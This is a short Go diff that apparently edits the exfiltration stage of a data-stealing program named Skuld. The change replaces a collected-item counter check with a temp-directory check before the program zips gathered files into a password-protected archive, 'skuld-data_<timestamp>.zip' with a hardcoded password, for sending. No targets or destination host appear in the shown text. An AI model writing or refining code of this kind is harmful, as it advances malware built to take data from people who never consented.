@@ -80,11 +80,6 @@ func (dc *DataCollector) SendCollectedData() error {
 	dc.mutex.Lock()
 	defer dc.mutex.Unlock()
 
-	// Check if we have any data to send
-	if dc.dataCount == 0 {
-		return fmt.Errorf("no data collected")
-	}
-
 	// Create timestamp for unique archive name
 	timestamp := time.Now().Format("2006-01-02_15-04-05")
 	archiveName := fmt.Sprintf("skuld-data_%s.zip", timestamp)
@@ -92,6 +87,12 @@ func (dc *DataCollector) SendCollectedData() error {
 	
 	// Create password-protected archive
 	password := "skuld2025"
+	
+	// Check if temp directory has content
+	if files, err := os.ReadDir(dc.TempDir); err != nil || len(files) == 0 {
+		return fmt.Errorf("no data to archive")
+	}
+	
 	if err := fileutil.ZipWithPassword(dc.TempDir, archivePath, password); err != nil {
 		return fmt.Errorf("failed to create archive: %v", err)
 	}
